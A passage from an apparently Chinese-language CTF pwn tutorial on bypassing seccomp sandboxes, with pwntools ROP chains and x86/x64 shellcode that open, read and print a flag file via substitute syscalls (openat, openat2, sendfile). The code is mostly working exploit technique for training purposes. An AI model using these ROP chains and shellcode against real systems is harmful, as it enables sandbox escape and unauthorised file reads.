class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop = rop.replace(p64(<span class="number">0xdeadbeef</span>), p64(rop_addr + <span class="built_in">len</span>(rop)))</span><br><span class="line">rop += <span class="string">b&quot;flag\x00&quot;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="32-位版本"><a href="#32-位版本" class="headerlink" title="32 位版本"></a>32 位版本</h4><p>32 位下由于 linux 调用约定是外平栈，因此连续函数调用需要在函数返回地址写平栈 gadget 。 </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">rop_addr = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; pop edi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(<span class="number">3</span>)</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">rop = rop.replace(p64(<span class="number">0xdeadbeef</span>), p64(rop_addr + <span class="built_in">len</span>(rop)))</span><br><span class="line">rop += <span class="string">b&quot;flag\x00&quot;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="系统调用替代"><a href="#系统调用替代" class="headerlink" title="系统调用替代"></a>系统调用替代</h3><p>有的题目除了禁用 <code>execve</code> 系统调用外，还可能会禁用 <code>open</code> ，<code>read</code> ，<code>write</code> 这些系统调用。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line">0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011</span><br><span class="line">0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011</span><br><span class="line">0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011</span><br><span class="line">0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011</span><br><span class="line">0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line">0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>对于这种情况我们可以使用可以代替被禁用的系统调用的其他系统调用。</p>
<h4 id="open-替代系统调用"><a href="#open-替代系统调用" class="headerlink" title="open 替代系统调用"></a>open 替代系统调用</h4><h5 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h5><p>系统调用 <code>openat</code> 的原型如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数：</strong><ul>
<li><p><strong>dirfd</strong></p>
<ul>
<li>目录文件描述符（一个已打开的目录 <code>fd</code>）。</li>
<li>若 <code>pathname</code> 是<strong>相对路径</strong>，则以 <code>dirfd</code> 指定的目录为基准解析。</li>
<li>若 <code>pathname</code> 是<strong>绝对路径</strong>（以 <code>/</code> 开头），<strong>忽略</strong> <code>dirfd</code>。</li>
<li>可传 **<code>AT_FDCWD</code> (-100)**：表示“相对于当前工作目录”解析（等价于传统 <code>open</code> 的行为）。</li>
</ul>
</li>
<li><p><strong>pathname</strong></p>
<ul>
<li>要打开的路径（文件或目录），可为绝对&#x2F;相对路径。</li>
<li>常配合 <code>flags</code> 中的控制位决定行为（是否创建、是否要求目录等）。</li>
</ul>
</li>
<li><p><strong>flags</strong></p>
<ul>
<li><p>低两位为访问模式：<code>O_RDONLY</code>(0)、<code>O_WRONLY</code>(1)、<code>O_RDWR</code>(2)（三选一）。</p>
</li>
<li><p>常用叠加位（按需或运算组合）：</p>
<ul>
<li><code>O_CREAT</code>：不存在则创建（**此时会用到 <code>mode</code>**）。</li>
<li><code>O_EXCL</code>：与 <code>O_CREAT</code> 同用，若已存在则报错（避免竞态）。</li>
<li><code>O_TRUNC</code>：以写方式打开时截断为 0 长度。</li>
<li><code>O_APPEND</code>：追加写。</li>
<li><code>O_CLOEXEC</code>：设置 close-on-exec（子进程执行 <code>exec</code> 时自动关闭）。</li>
<li><code>O_DIRECTORY</code>：要求目标必须为目录。</li>
<li><code>O_NOFOLLOW</code>：最终路径分量不能是符号链接。</li>
<li><code>O_NONBLOCK</code>、<code>O_SYNC</code>&#x2F;<code>O_DSYNC</code>、<code>O_PATH</code> 等按需使用。</li>
<li>（Linux 特有）<code>O_TMPFILE</code>：在指定目录创建匿名临时文件（需 <code>O_RDWR</code>&#x2F;<code>O_WRONLY</code> 且 <code>pathname</code> 指向目录）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>mode</strong></p>
<ul>
<li><strong>仅在</strong> 指定了 <code>O_CREAT</code>（或 Linux 的 <code>O_TMPFILE</code>）时生效，表示新建文件的权限位（如 <code>0644</code>）。</li>
<li>最终权限会受进程的 <strong><code>umask</code></strong> 过滤（实际权限 &#x3D; <code>mode &amp; ~umask</code>）。</li>
<li>不创建时（未用 <code>O_CREAT/O_TMPFILE</code>），该参数<strong>被忽略</strong>，可随意填（通常写成 <code>0</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>返回值：</strong><ul>
<li><strong>成功</strong>：返回一个 <strong>非负</strong> 文件描述符（<code>int fd &gt;= 0</code>）。</li>
<li><strong>失败</strong>：返回 <strong>-1</strong>，并设置 <code>errno</code>（常见如 <code>EACCES</code>、<code>ENOENT</code>、<code>ENOTDIR</code>、<code>EEXIST</code>(配 <code>O_EXCL</code>)、<code>ELOOP</code>、<code>EINVAL</code>、<code>EMFILE/ENFILE</code> 等）。</li>
</ul>
</li>
</ul>
<p><strong>需要注意 <code>open</code> 函数实际上是调用了 <code>openat</code> 系统调用。</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">rop_addr = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">rop  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(-<span class="number">100</span> % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>))</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(heap_4 + <span class="number">0x100</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">437</span>)  <span class="comment"># SYS_openat2</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line"></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop = rop.replace(p64(<span class="number">0xdeadbeef</span>), p64(rop_addr + <span class="built_in">len</span>(rop)))</span><br><span class="line">rop += <span class="string">b&quot;flag\x00&quot;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* fd = openat(AT_FDCWD, &quot;/flag&quot;, O_RDONLY) */</span></span><br><span class="line"><span class="string">    mov rdi, -100</span></span><br><span class="line"><span class="string">    lea rsi, [rip+path]</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    mov eax, 257</span></span><br><span class="line"><span class="string">    syscall                    /* rax = fd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* n = read(fd, rsp, 0x400) */</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    sub rsp, 0x400</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x400</span></span><br><span class="line"><span class="string">    xor eax, eax               /* SYS_read = 0 */</span></span><br><span class="line"><span class="string">    syscall                    /* rax = n */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* write(1, rsp, n) */</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov eax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">path: .asciz &quot;/flag&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* fd = openat(AT_FDCWD, &quot;/flag&quot;, O_RDONLY) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* 在栈上压入字符串 &quot;/flag\0&quot; */</span></span><br><span class="line"><span class="string">    push 0x00000067          /* &#x27;g\0\0\0&#x27; */</span></span><br><span class="line"><span class="string">    push 0x616c662f          /* &#x27;/fla&#x27; */</span></span><br><span class="line"><span class="string">    mov ebx, -100            /* AT_FDCWD = -100 */</span></span><br><span class="line"><span class="string">    mov ecx, esp             /* pathname = &quot;/flag&quot; */</span></span><br><span class="line"><span class="string">    xor edx, edx             /* flags = O_RDONLY = 0 */</span></span><br><span class="line"><span class="string">    xor esi, esi             /* mode = 0 */</span></span><br><span class="line"><span class="string">    mov eax, 295             /* __NR_openat (x86) */</span></span><br><span class="line"><span class="string">    int 0x80                 /* eax = fd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* n = read(fd, esp, 0x400) */</span></span><br><span class="line"><span class="string">    mov ebx, eax             /* fd */</span></span><br><span class="line"><span class="string">    sub esp, 0x400           /* 给读缓冲区腾空间 */</span></span><br><span class="line"><span class="string">    mov ecx, esp             /* buf = esp */</span></span><br><span class="line"><span class="string">    mov edx, 0x400           /* count */</span></span><br><span class="line"><span class="string">    mov eax, 3               /* __NR_read */</span></span><br><span class="line"><span class="string">    int 0x80                 /* eax = n */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* write(1, esp, n) */</span></span><br><span class="line"><span class="string">    mov ebx, 1               /* fd = 1 (stdout) */</span></span><br><span class="line"><span class="string">    mov ecx, esp             /* buf */</span></span><br><span class="line"><span class="string">    mov edx, eax             /* n */</span></span><br><span class="line"><span class="string">    mov eax, 4               /* __NR_write */</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    jmp get_path</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">    /* fd = openat(AT_FDCWD, path, O_RDONLY, 0) */</span></span><br><span class="line"><span class="string">    mov ebx, -100         /* AT_FDCWD */</span></span><br><span class="line"><span class="string">    pop ecx               /* filename = path */</span></span><br><span class="line"><span class="string">    xor edx, edx          /* flags = O_RDONLY */</span></span><br><span class="line"><span class="string">    xor esi, esi          /* mode = 0 */</span></span><br><span class="line"><span class="string">    mov eax, 295          /* __NR_openat (i386) */</span></span><br><span class="line"><span class="string">    int 0x80              /* eax = fd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* n = read(fd, esp, 0x400) */</span></span><br><span class="line"><span class="string">    mov ebx, eax          /* fd */</span></span><br><span class="line"><span class="string">    sub esp, 0x400</span></span><br><span class="line"><span class="string">    mov ecx, esp</span></span><br><span class="line"><span class="string">    mov edx, 0x400</span></span><br><span class="line"><span class="string">    mov eax, 3            /* __NR_read */</span></span><br><span class="line"><span class="string">    int 0x80              /* eax = n */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* write(1, esp, n) */</span></span><br><span class="line"><span class="string">    mov ebx, 1            /* stdout */</span></span><br><span class="line"><span class="string">    mov ecx, esp</span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov eax, 4            /* __NR_write */</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* exit(0) 可要可不要 */</span></span><br><span class="line"><span class="string">    ; xor ebx, ebx</span></span><br><span class="line"><span class="string">    ; mov eax, 1          /* __NR_exit */</span></span><br><span class="line"><span class="string">    ; int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">get_path:</span></span><br><span class="line"><span class="string">    /* 这里用 call-pop 拿到 path 的地址 */</span></span><br><span class="line"><span class="string">    call main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">path:</span></span><br><span class="line"><span class="string">    .asciz &quot;/flag&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br></pre></td></tr></table></figure></div>

<h5 id="openat2"><a href="#openat2" class="headerlink" title="openat2"></a>openat2</h5><p>系统调用原型如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>          <span class="comment">// O_* / S_* 常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/openat2.h&gt;</span>  <span class="comment">// RESOLVE_* 常量与 struct open_how</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">syscall</span><span class="params">(SYS_openat2, <span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *path,</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> open_how *how, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>glibc 目前<strong>不提供</strong> <code>openat2()</code> 的封装，需要用 <code>syscall(2)</code>。</p>
</blockquote>
<p><strong><code>struct open_how</code> 关键字段</strong></p>
<ul>
<li><p><code>flags</code>：与 <code>openat(2)</code> 的 <code>flags</code> 语义一致，但 <code>openat2()</code> 对未知&#x2F;冲突位会报错（更严格）。</p>
</li>
<li><p><code>mode</code>：仅在创建时使用（与 <code>openat(2)</code> 一致）。</p>
</li>
<li><p><code>resolve</code>：<strong>解析约束位</strong>，比如：</p>
<ul>
<li><code>RESOLVE_BENEATH</code>、<code>RESOLVE_IN_ROOT</code>：限制路径逃逸（如禁止 <code>..</code> 逃出根、模拟“临时 chroot”）。</li>
<li><code>RESOLVE_NO_SYMLINKS</code> &#x2F; <code>RESOLVE_NO_MAGICLINKS</code>：禁用符号链接或 <code>/proc</code> “魔法链接”解析。</li>
<li><code>RESOLVE_NO_XDEV</code>：禁止跨挂载点。</li>
<li><code>RESOLVE_CACHED</code>：<strong>仅用缓存</strong>完成解析，否则返回 <code>EAGAIN</code>。<br>以上语义详见手册页（含更多边界与错误码）。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>20.10</strong>（内核 <strong>5.8</strong>）及之后默认 **支持 <code>openat2</code>**；</p>
<p><strong>20.04 LTS</strong> 若安装 <strong>HWE</strong>：<strong>20.04.2</strong> 起用 <strong>5.8</strong>、<strong>20.04.3</strong> 起用 <strong>5.11</strong>、<strong>20.04.5</strong> 起用 <strong>5.15</strong> —— 均 <strong>≥ 5.6</strong>，因此 <strong>HWE 环境支持 <code>openat2</code></strong></p>
<p>i386 根本不支持 <code>openat2</code> ，调用会触发 <code>ENOSYS</code> （No such syscall）。</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* fd = openat2(AT_FDCWD, &quot;/flag&quot;, &amp;how, sizeof(how)) */</span></span><br><span class="line"><span class="string">    mov rdi, -100                 /* AT_FDCWD */</span></span><br><span class="line"><span class="string">    lea rsi, [rip+path]           /* pathname */</span></span><br><span class="line"><span class="string">    lea rdx, [rip+how]            /* struct open_how* */</span></span><br><span class="line"><span class="string">    mov r10, 24                   /* sizeof(struct open_how) = 3*8 */</span></span><br><span class="line"><span class="string">    mov eax, 437                  /* SYS_openat2 */</span></span><br><span class="line"><span class="string">    syscall                       /* rax = fd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* n = read(fd, rsp, 0x400) */</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    sub rsp, 0x400</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x400</span></span><br><span class="line"><span class="string">    xor eax, eax                  /* SYS_read */</span></span><br><span class="line"><span class="string">    syscall                       /* rax = n */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* write(1, rsp, n) */</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov eax, 1                    /* SYS_write */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">path: .asciz &quot;/flag&quot;</span></span><br><span class="line"><span class="string">how:</span></span><br><span class="line"><span class="string">    .quad 0       /* flags = O_RDONLY */</span></span><br><span class="line"><span class="string">    .quad 0       /* mode  = 0 */</span></span><br><span class="line"><span class="string">    .quad 0       /* resolve = 0 */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="read-write-替代系统调用"><a href="#read-write-替代系统调用" class="headerlink" title="read &#x2F; write 替代系统调用"></a>read &#x2F; write 替代系统调用</h4><h5 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h5><p>在内核态<strong>直接</strong>在两个 fd 间搬运数据（常见于“读文件→写 socket&#x2F;终端”）。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>Linux 2.2</strong> 起；单次最大约 <code>0x7ffff000</code> 字节。</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* openat(AT_FDCWD, &quot;/flag&quot;, O_RDONLY) */</span></span><br><span class="line"><span class="string">    mov rdi, -100</span></span><br><span class="line"><span class="string">    lea rsi, [rip+path]</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    mov eax, 257</span></span><br><span class="line"><span class="string">    syscall                 /* rax = fd */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* sendfile(1, fd, NULL, 0x7ffff000) */</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rax</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    mov r10, 0x7ffff000</span></span><br><span class="line"><span class="string">    mov eax, 40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">path: .asciz &quot;/flag&quot;</span></span><br><span class="line"><span 